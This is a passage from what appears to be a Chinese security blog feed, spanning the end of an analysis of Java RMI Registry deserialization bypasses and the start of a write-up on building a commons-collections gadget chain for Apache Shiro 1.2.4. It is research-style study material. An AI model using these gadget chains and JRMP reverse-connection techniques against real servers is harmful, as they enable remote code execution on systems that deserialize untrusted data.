class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x02中发送的对象是代理后的AnnotationInvocationHandler对象，并不在上述允许的类里面，这导致原先ysoserial工具中的ysoserial.exploit.RMIRegisterExploit无法利用。这里我们参考<a href="http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/" target="_blank" rel="noopener">3</a>的方法来达成利用。</p><p>首先思路比较明确的是，如果要绕过这个限制，我们需要在上述的白名单里找到可以利用的对象。</p><p>在白名单里我们注意一下两个特殊对象Remote对象和UnicastRef对象</p><h3 id="1-UnicastRef对象"><a href="#1-UnicastRef对象" class="headerlink" title="1. UnicastRef对象"></a>1. UnicastRef对象</h3><p>我们都知道RMI过程中存在客户端与服务器端之间的交互，那么在代码层面，我们需要怎么去创造这样一个链接呢？</p><p>由于漏洞发生点为向远程服务器注册对象的引用。回顾一下，我们在bind时，会先去获得一个Registry，类似下面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">"192.168.98.80"</span>);</span><br></pre></td></tr></table></figure><p>跟进<code>java/rmi/registry/LocateRegistry.java#getRegistry</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131185848839.png" alt="image-20200131185848839"></p><p>注意到这样一段代码，通过TCPEndpoint注册服务端的host、端口等信息，以UnicastRef封装liveRef.在下面createProxy时使用了RemoteObjectInvocationHandler作为UnicastRef动态代理的处理类</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131191232156.png" alt="image-20200131191232156"></p><p>最终，我们将以客户端的身份去链接，所以这里的Registry会是<code>sun/rmi/registry/RegistryImpl_Stub.java#bind</code>向远程RMI Registry注册。</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131231355987.png" alt="image-20200131231355987"></p><p>newCall发起连接，并将需要绑定的对象发送过去。</p><p>到这里就结束了向远程Registry发起绑定的操作。这个过程中我们用到了UnicastRef对象，那么这里想象一下，如果我们可以控制UnicastRef对象里LiveRef的host和port，那么我们就能发起任意的RMI连接。这里就是ysoserial中JRMPClient的原理，来看一下这个payload</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131232428711.png" alt="image-20200131232428711"></p><p>是不是很熟悉XD，使用的方法就是前面绑定过程中的代码。而在白名单里UnicastRef对象是允许被反序列化的。</p><h3 id="2-RemoteObjectInvocationHandler对象"><a href="#2-RemoteObjectInvocationHandler对象" class="headerlink" title="2. RemoteObjectInvocationHandler对象"></a>2. RemoteObjectInvocationHandler对象</h3><p>前面分析到UnicastRef可被用于发起RMI连接，但是为了符合发送的条件，仍然需要满足实现Remote接口的条件。而UnicastRef并没有实现Remote接口，这就意味着直接传UnicastRef是不行的，我们还需要再多做一步，这里有两种方法：</p><ol><li>跟RMIRegisterExploit一样，使用Proxy反射来实现，其handler继承于Remote并处理了构造好的UnicastRef，这里用到的就是RemoteObjectInvocationHandler</li><li>找到一个可以封装UnicastRef的对象，并且该对象还实现了Remote对象</li></ol><p>这里JRMPClient使用的RemoteObjectInvocationHandler就是第一种方法，我们将AnnotationInvocationHandler替换成RemoteObjectInvocationHandler。在反序列化时会调用RemoteObjectInvocationHandler的父类RemoteObject的readObject函数</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220005786.png" alt="image-20200110220005786"></p><p>这里的ref就是我们传进去的UnicastRef，调用其readExternal函数，这里介绍一下readExternal</p><blockquote><p>Java默认的序列化机制非常简单，而且序列化后的对象不需要再次调用构造器重新生成，但是在实际中，我们可以会希望对象的某一部分不需要被序列化，或者说一个对象被还原之后，其内部的某些子对象需要重新创建，从而不必将该子对象序列化。 在这些情况下，我们可以考虑实现Externalizable接口从而代替Serializable接口来对序列化过程进行控制。<br>Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。</p><p><a href="https://xz.aliyun.com/t/5392" target="_blank" rel="noopener">https://xz.aliyun.com/t/5392</a></p></blockquote><p>这里的readExternal就是重新创建一个tcp连接</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220105735.png" alt="image-20200110220105735"></p><p>继续往下跟</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220150019.png" alt="image-20200110220150019"></p><p>重新生成一个LiveRef对象后，将存储到当前的ConnectionInputStream上。后续该stream会继续调用registerRefs函数</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220710690.png" alt="image-20200110220710690"></p><p>最终由DGCClient发起连接，下图中的loopup函数</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220823670.png" alt="image-20200110220823670"></p><p>到这里后面就是JRMPListener反序列化的东西了，这里在最后进行分析。</p><h3 id="3-RMIConnectionImpl-Stub对象"><a href="#3-RMIConnectionImpl-Stub对象" class="headerlink" title="3. RMIConnectionImpl_Stub对象"></a>3. RMIConnectionImpl_Stub对象</h3><p>前面提到了两种思路，还有一种就是找到一个实现了Remote接口并且封装了ref的对象，这里RMIConnectionImpl_Stub对象就是</p><p>RemoteObjectInvocationHandler后续的触发主要依靠RemoteObject对象的readObject函数的重新填充，而RMIConnectionImpl_Stub对象也继承了RemoteObject所以后面的一些调用过程跟第二个对象一样，不再叙述。</p><p>其实顺着思路找还能发现<code>DGCImpl_Stub</code>、<code>RMIServerImpl_Stub</code>、<code>RegistryImpl_Stub</code>、<code>ReferenceWrapper_Stub</code>都可以</p><h3 id="20200616-更新一个小trick"><a href="#20200616-更新一个小trick" class="headerlink" title="20200616 更新一个小trick"></a>20200616 更新一个小trick</h3><p>前面2的部分提到了由于UnicastRef的反序列化，还原的内容ref会被注册到当前的ConnectionInputStream的incomingRefTable，并于StreamRemoteCall的releaseInputStream时调用发起反向jrmp链接。</p><p>这里的重点在于UnicastRef的反序列化，我们在3的部分找的那几个类都是因为封装UnicastRef，在实际反序列化的过程中，这几个类的属性被调用反序列化而还原UnicastRef。</p><p>在常见的readObject函数的处理中，其实有一点很重要，他是一个递归反序列化的过程，就算当前类不存在，但是还是会去递归反序列化当前数据中的类属性。</p><p>所以我们也可以不用前面找到的几个类，自己写一个封装UnicastRef也能同样达到这种效果，具体看<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/java/rmi/RMIConnectWrapped.java" target="_blank" rel="noopener">RMIConnectWrapped</a></p><h2 id="0x04-后续-jdk-gt-8u232-b09"><a href="#0x04-后续-jdk-gt-8u232-b09" class="headerlink" title="0x04 后续 jdk&gt;=8u232_b09"></a>0x04 后续 jdk&gt;=8u232_b09</h2><p>jdk版本8u232_b09修复了前面使用反向发起JRMP连接的利用。修复点包括两个</p><h3 id="一：RegistryImpl-Skel"><a href="#一：RegistryImpl-Skel" class="headerlink" title="一：RegistryImpl_Skel"></a>一：RegistryImpl_Skel</h3><p><code>sun.rmi.registry.RegistryImpl_Skel#dispatcher</code>，这里截了lookup函数的处理，bind/rebind函数的处理是一样的</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512145332476.png" alt="image-20200512145332476"></p><p>当发生反序列化错误或者类型转换错误时，会调用<code>call.discardPendingRefs</code>，将现有的JRMP连接清除掉。也就意味着这里我们无法用JRMP反向链接的方式来达成利用了。</p><h3 id="二：DGCImpl-Stub"><a href="#二：DGCImpl-Stub" class="headerlink" title="二：DGCImpl_Stub"></a>二：DGCImpl_Stub</h3><p>当Registry处理JRMP反连的时候，会调用<code>DGCImpl_Stub#dirty</code>，而<code>ref.invoke</code>会最终调用<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>来处理返回的异常，这里会最终导致反序列化(详细见0x05番外)</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512145824806.png" alt="image-20200512145824806"></p><p>而在232版本，将原本在后面注册的<code>leaseFilter</code>提到了前面</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512150213665.png" alt="image-20200512150213665"></p><p>看看该过滤器的限制<code>sun/rmi/transport/DGCImpl_Stub.java#leaseFilter</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200118182504042.png" alt="image-20200118182504042"></p><p>对于返回的序列化对象，只允许上面的几种类型，而现有的反序列化利用链中HashSet、HashTable等类都是通不过的。</p><p>所以在Registry发起的反向连接是无法利用成功的。</p><p>ps:这里用的<code>DGCImpl_Stub</code>是客户端发起时使用的，相对应的还有server端接收Client发起的连接的处理<code>DGCImpl_Skel</code>，skel这里也存在反序列化漏洞，具体见0x08</p><h2 id="0x05-番外：ysoserial中的JRMPListener与JRMPClient"><a href="#0x05-番外：ysoserial中的JRMPListener与JRMPClient" class="headerlink" title="0x05 番外：ysoserial中的JRMPListener与JRMPClient"></a>0x05 番外：ysoserial中的JRMPListener与JRMPClient</h2><p>看了上面可能你会疑惑，为什么server端发起一个RMI的连接就会触发java反序列化？</p><p>前文我们将的是RMI Registry在接收远程绑定对象时所发生的反序列化漏洞，那么RMI Client在接收Server端的数据时是否也会发生反序列化漏洞呢？答案是肯定的，毕竟RMI交互过程中的数据采用的是序列化的数据，也就意味着存在着一个反序列化的过程。</p><p>看一下JRMPListener的代码，简单来说，其实现了与RMI Client的交互流程。这里我们直接看重点的代码</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200202161819982.png" alt="image-20200202161819982"></p><p>在完成前面的一些交互步骤后，Listener会向Client发送一个ExceptionalReturn的状态，并将序列化的payload填充到BadAttributeValueExpException的val属性。这里用的BadAttributeValueExpException并不是我们以前分析时做的toString触发点，而是仅作为payload的一个载体，在反序列化BadAttributeValueExpException的val属性时同样反序列化了我们的payload。</p><p>而位于Client在接收到ExceptionalReturn时的处理方式见<code>sun/rmi/transport/StreamRemoteCall.java#executeCall</code>前面的分析都省略了</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200202163234429.png" alt="image-20200202163234429"></p><p>在这里我们看到了熟悉的readObject函数，其用于将前面的Exception进行反序列化。</p><p>到这里就可以串起来了，Client发起RMI连接，连接到我们的恶意Listener上面。而我们的Listener将返回一个构造好的Exception，旨在Client接收到ExceptionalReturn的信号时进行还原，从而造成了RMI Client端也受到反序列化漏洞的攻击。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>前文主要讲诉了RMI的相关反序列化问题，包括RMI Registry和RMI Client接收到反序列化数据时产生的反序列化漏洞。</p><p>全文所使用的JDK版本为JDK8，在分析过程中，发现在最近的JDK8u版本上，已无法对RMI Registry发起攻击，但其在JDK8u232_b09之前的版本还是可以的。</p><p>本文主要攻击的是RMI Registry，而RMI的攻击面不单单文中提到的这种方式，还存在</p><ol><li>针对codebase的攻击见<a href="https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.md，加载我们构造好的class。当然现在这种情况比较少了。" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.md，加载我们构造好的class。当然现在这种情况比较少了。</a></li><li>针对绑定的危险obj的攻击，我们可以通过list所有绑定的obj，查找危险的绑定地址进行攻击。这里的危险怎么定义呢？第一是绑定的对象确实存在操作系统命令等；第二是该对象的类函数参数中存在反序列化点，比如hello(HashTable xxx)，其中的HashTable是CommonsCollections7的触发点，在传递过程中，xxx会被序列化，到了RMI Server时会反序列化，也就执行了我们的payload。最后，这里暂时还没找到案例…</li></ol><h2 id="0x07-20200303更新-UnicastRemoteObject-Gadget"><a href="#0x07-20200303更新-UnicastRemoteObject-Gadget" class="headerlink" title="0x07 20200303更新 UnicastRemoteObject Gadget"></a>0x07 20200303更新 UnicastRemoteObject Gadget</h2><p>这个Gadget的来源是<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p><p>经过测试，这个Gadget可以做到跟JRMPClient一样的效果，但是无法跟上面的Level2一样绕过限制，原因看下面</p><p>本地在bind或rebind一个Remote对象时，会在sun/rmi/server/MarshalOutputStream.java#replaceObject进行转化</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200303203244913.png" alt="image-20200303203244913"></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200303203931864.png" alt="image-20200303203931864"></p><p>原来的对象会被转化成上面的一个结构，这里直接丢掉了UnicastRemoteObject，自然在Registry端无法从UnicastRemoteObject的readObject函数开始，这样这个Gadget就无法成功利用了。</p><p>要想利用这个链来绕过限制，我们可能得自己写一个bind的过程才可以，把getTarget的过程去掉直接发过去。这个Gadget利用价值比较低XD</p><p>ps：貌似可以通过重写的方式来解决这个问题，这里有空再分析XD</p><h3 id="20200617-更新UnicastRemoteObject-Gadget"><a href="#20200617-更新UnicastRemoteObject-Gadget" class="headerlink" title="20200617 更新UnicastRemoteObject Gadget"></a>20200617 更新UnicastRemoteObject Gadget</h3><p>前面在做分析时，发现在使用这个利用链的时候，在发过去之前就会被替换UnicastRef的问题，导致我们发到Registry后无法还原出正确的jrmp，今天来看看他是怎么替换的</p><p><code>java.io.ObjectOutputStream#writeObject0#1143</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">  Object rep = replaceObject(obj);</span><br><span class="line">  <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">    cl = rep.getClass();</span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  obj = rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>call.getOutputStream()</code>获取到的outputstream在写入具体的object时，后续会执行到前面的代码上，判断是否需要enableReplace（默认是true），所以会默认走到我在3月份时分析的地方，把我们想要的jrmp连接给替换掉了。</p><p>所以解决这个问题的方案就是将这个enableReplace给置为false，这里实现起来就比较简单了，我们可以直接对outputstream做反射调用，替换true为false，具体实现见<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/exploit/rmi/component/Naming.java#L34" target="_blank" rel="noopener">L34</a></p><p>这里需要提一点的是这条链巧妙之处在于</p><ol><li>UnicastRemoteObject利用链用到的对象都是在Registry可反序列化的白名单里的</li><li>跟前面几个封装unicastref的思路不同，UnicastRemoteObject实际上是主动向外发出jrmp连接的方式，而不是前面通过incomingtable表的方式去触发jrmp连接</li></ol><p>为什么说他巧妙呢？在&gt;=8u232_b09版本存在两个限制（具体见0x04）</p><ol><li>消除了封装unicastRef的威胁</li><li>在DGC层添加了白名单的方式，导致就算jrmp能反链也不能反序列化出白名单之外的类</li></ol><p>而UnicastRemoteObject绕过了上面的两个限制</p><ol><li><p>首先对于第一个限制，UnicastRemoteObject的jrmp反连发生在readObject过程中</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200617230402963.png" alt="image-20200617230402963"></p></li><li><p>其次对于第二个限制，前面提到Registry能触发JRMP反连主要是因为调用了<code>DGCClient.registerRefs</code>去处理</p><p>而过这个点就需要受到前面提到的DGC白名单的问题。怎么绕过这个地方？简单的就是找一个不经过DGCClient来触发即可。</p><p>前面分析&lt;8u232_b09时，用到的RemoteObjectInvocationHandler的方式来触发，不过这里其实只用到了封装UnicastRef的作用（这里提一下实际触发时需要调用UnicastRef.invoke）。UnicastRemoteObject对这个handler做了更深入的利用，这里用到了<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200617234429050.png" alt="image-20200617234429050"></p><p>调用了<code>ref.invoke</code>触发jrmp反连，到这里都没有经过DGCClient的路径，自然也就没有白名单的限制。</p></li></ol><p>不过这条链到了8u242也失效了，主要原因在于lookup接口无法再反序列化非string类型的object了</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200618002342127.png" alt="image-20200618002342127"></p><h2 id="0x08-RMI-DGC实现问题-ysoserial-expliots-JRMPClient"><a href="#0x08-RMI-DGC实现问题-ysoserial-expliots-JRMPClient" class="headerlink" title="0x08 RMI DGC实现问题(ysoserial.expliots.JRMPClient)"></a>0x08 RMI DGC实现问题(ysoserial.expliots.JRMPClient)</h2><p>在JEP290之前，RMI的DGCImpl_skel#dipatch接收处，获取到数据后，直接readObject造成的。</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202106633.png" alt="image-20200306202106633"></p><p>在JEP290之后，反序列化前做了校验，见DGCImpl</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202539911.png" alt="image-20200306202539911"></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202604696.png" alt="image-20200306202604696"></p><p>导致了ysoserial的exploit中的JRMPClient失效</p><h2 id="0x09-总结中第二种方式的触发点（20200317-更新）"><a href="#0x09-总结中第二种方式的触发点（20200317-更新）" class="headerlink" title="0x09 总结中第二种方式的触发点（20200317 更新）"></a>0x09 总结中第二种方式的触发点（20200317 更新）</h2><p>前面总结中提到的第二中方式：通过寻找可以利用的绑定对象的函数的参数进行反序列化利用</p><p>直接讲触发点<code>sun/rmi/server/UnicastServerRef.java#dispatch#338</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203347230.png" alt="image-20200317203347230"></p><p>当我们编写Client端对Server端挂载的对象进行远程函数调用（RMI）时，Server端会逐一进行（获取到Methtod，解析parameters，最后进行invoke调用）。而在解析params时（我们讲过RMI过程中，对象均是序列化的状态）我们需要先对参数对象进行反序列化，也就是第338行所做的工作，继续往下跟</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203723497.png" alt="image-20200317203723497"></p><p>在函数<code>unmarshalParametersUnchecked</code>中分别对每个参数进行反序列化还原</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203838431.png" alt="image-20200317203838431"></p><p>如果所接受的类型非基础数据结构，那么将直接调用readObject，这部分并没有前面filter的限制</p><p>所以如果找到了一个Server端挂载的对象存在函数参数类型为Object、HashTable等类型时，我们可以直接穿入构造好的反序列化利用链。当前前提还是Server端的环境中存在相应的反序列化利用链的依赖。</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链挖掘之Shiro反序列化</title>
      <link href="2019/11/10/java/study-java-deserialized-shiro-1-2-4/"/>
      <url>2019/11/10/java/study-java-deserialized-shiro-1-2-4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在跟了一遍commons-collections系列的payload后，终于可以开始解决一下当时对shiro反序列化模凌两可的认识了。</p><a id="more"></a><p>当前，不管是国内实际的xx行动还是ctf比赛，shiro反序列化会经常看到。但在实际利用这个漏洞的时候，会发现我们无法在tomcat下直接利用shiro-sample中的<code>commons-collections:3.2.1</code>（2021-03-16更新，这里经p牛指正，shiro并没有依赖cc库，<a href="https://t.zsxq.com/372nM7y" target="_blank" rel="noopener">详情</a>）。</p><p>我们前面已经对commons-collections系列利用链的分析，今天就来根据学到的知识来解决这个问题。</p><p>本文讨论了shiro-1.2.4版本无法直接利用现有的ysoserial利用链，并提出了相应的解决方案。</p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>这里用的是<a href="!https://github.com/apache/shiro">shiro-root-1.2.4</a>的samples/web环境，clone下来后执行<code>git checkout shiro-root-1.2.4</code></p><p>利用脚本参考的<a href="!https://blog.knownsec.com/2016/08/apache-shiro-java/">知道创宇的一篇分析</a></p><p>ysoserial用的0.0.6版本<code>https://github.com/frohoff/ysoserial</code></p><p>先来讲一下，关于环境方面遇到的坑：</p><ol><li><p>在部署过程中，遇到了<a href="https://stackoverflow.com/questions/8701307/the-absolute-uri-http-java-sun-com-jsp-jstl-core-cannot-be-resolved-in-either" target="_blank" rel="noopener">The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application</a>的错误</p><p>这里的解决方案是修改pom.xml</p></li></ol><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191108153248897.png" alt="image-20191108153248897"></p><p>​            添加jstl的具体版本即可解决。</p><ol start="2"><li><p>serialVersionUID不一致导致无法反序列化的问题</p><p>这里可能在你的实验环境下不一定会遇到，我的实验环境和ysoserial生成的某几个类的serialVersionUID不一致，导致无法正常反序列化。在实战中你可以采用<a href="http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/" target="_blank" rel="noopener">这篇文章</a>处理方法，这里我的解决方案是直接同步个<code>commons-collections:3.2.1</code>版本，在生成war包前，在pom.xml加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="0x02-前景回顾"><a href="#0x02-前景回顾" class="headerlink" title="0x02 前景回顾"></a>0x02 前景回顾</h1><p>16年的时候，shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析：</p><ul><li>1.<a href="https://blog.knownsec.com/2016/08/apache-shiro-java/" target="_blank" rel="noopener">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li>2.<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a></li><li>3.<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>除了1中在漏洞环境下添加了<code>commons-collections:4.0</code>，另外两篇文章均提到了在tomcat下无法直接利用<code>commons-collections:3.2.1</code>的问题。接下来我们就来看看是什么原因吧：）</p><p><code>org.apache.shiro.io.DefaultSerializer.deserialize:67</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109160945448.png" alt="image-20191109160945448"></p><p>这里我们直接看反序列化发生的点，第75行使用了<code>ClassResolvingObjectInputStream</code>类而非传统的<code>ObjectInputStream</code>.这里可能是开发人员做的一种防护措施？他重写了<code>ObjectInputStream</code>类的<code>resolveClass</code>函数，我曾在第一篇<a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/">基础文章</a>中分析过Java反序列化的过程，<code>ObjectInputStream</code>的<code>resolveClass</code>函数用的是<code>Class.forName</code>类获取当前描述器所指代的类的Class对象。而重写后的<code>resolveClass</code>函数</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109162524242.png" alt="image-20191109162524242"></p><p>采用的是<code>ClassUtils.forName</code>，我们继续看这个forName的实现。</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109163048059.png" alt="image-20191109163048059"></p><p>来看看这个<code>ExceptionIgnoringAccessor</code>是怎么实现的</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109164548583.png" alt="image-20191109164548583"></p><p>这里实际上调用了<code>ParallelWebAppClassLoader</code>父类<code>WebappClassLoaderBase</code>的<code>loadClass</code>函数（可以直接下断点看看内容）。<img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png" alt="image-20191110110209579"></p><p>该loadClass载入按照上述的顺序（这里不贴代码了，找到<code>org.apache.catalina.loader.WebappClassLoaderBase.loadClass</code>即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类<code>URLClassLoader</code>的<code>loadClass</code>函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即<code>/Lorg/apache/commons/collections/Transformer;.class</code>，在参考的第二篇文章里有提到这个问题，所以导致shiro无法载入数组类型的对象。</p><p>那么如何才能真正的利用<code>commons-collections:3.2.1</code>来构造利用链呢？</p><p>首先，在参考的第一篇文章里，作者在环境中引入了<code>commons-collections:4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。</p><p>那么，问题来了，我们是否能构造出一个在<code>commons-collections:3.2.1</code>下可以利用，并且在利用链上不存在数组类型的对象？答案当然是肯定的：）</p><h1 id="0x03-新利用链构造"><a href="#0x03-新利用链构造" class="headerlink" title="0x03 新利用链构造"></a>0x03 新利用链构造</h1><p>根据0x02的介绍，我们可以清楚的是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为他的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，也就是在执行过程中发生的<code>ClassNotFoundException</code>。</p><p>如果你看过前几篇关于commons-collections系列的payload分析，那么你肯定可以回忆起来，除了利用<code>ChainedTransformer</code>这种方式，还可以使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes（这一部分不复述了，可以看前面的文章）。并且在这部分利用链上是不存在数组类型的对象的。</p><p>那么，接下来的重点就是找一个如何触发<code>TemplatesImpl.newTransformer</code>的方法了：）</p><p>我们先来回顾一下<code>CommonsCollections2</code>的利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>在这条链上，由于TransformingComparator在3.2.1的版本上还没有实现Serializable接口，其在3.2.1版本下是无法反序列化的。所以我们无法直接利用该payload来达到命令执行的目的。</p><p>那么就来改造改造吧！我们先将注意力关注在<code>InvokerTransformer.transform()</code>上</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110141818530.png" alt="image-20191110141818530"></p><p>这里是最经典的反射机制的写法，根据传入的<code>input</code>对象，调用其<code>iMethodName</code>（可控）。那么如果此时传入的<code>input</code>为构造好的<code>TemplatesImpl</code>对象呢？</p><p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p><p>那么问题来了，怎么将传入的<code>input</code>置为<code>TemplatesImpl</code>对象呢？</p><p>在ysoserial的利用链中，关于<code>transform</code>函数接收的<code>input</code>存在两种情况。</p><h3 id="1-配合ChainedTransformer"><a href="#1-配合ChainedTransformer" class="headerlink" title="1.配合ChainedTransformer"></a>1.配合<code>ChainedTransformer</code></h3><p><code>InvokerTransformer</code>往往同<code>ChainedTransformer</code>配合，循环构造Runtimt.getRuntime().exec。很明显，这里我们无法利用了。</p><h3 id="2-无意义的String"><a href="#2-无意义的String" class="headerlink" title="2.无意义的String"></a>2.无意义的<code>String</code></h3><p>这里的无意义的<code>String</code>指的是传入到<code>ConstantTransformer.transform</code>函数的<code>input</code>，该<code>transform</code>函数不依赖<code>input</code>，而直接返回<code>iConstant</code></p><p>这里第一条路肯定断了，那么就是怎么利用这个无意义的<code>String</code>了！</p><p>从<code>CommonsCollection5</code>开始，出现了<code>TiedMapEntry</code>，其作为中继，调用了<code>LazyMap</code>（map）的<code>get</code>函数。</p><p>来看一看</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143619051.png" alt="image-20191110143619051"></p><p>其中<code>map</code>和<code>key</code>我们都可以控制，而<code>LazyMap.get</code>调用了<code>transform</code>函数，并将可控的<code>key</code>传入<code>transform</code>函数</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143737549.png" alt="image-20191110143737549"></p><p>这里就接上了我们前面讨论的，将构造好的<code>TemplatesImpl</code>（key）作为<code>InvokerTransformer.transform</code>函数的<code>input</code>传入，我们就可以将templates gadgets串起来了。</p><p>简单来说，我们将<code>CommonsCollections5,6,9</code>构造链中的<code>TiedMapEntry</code>的key用了起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span 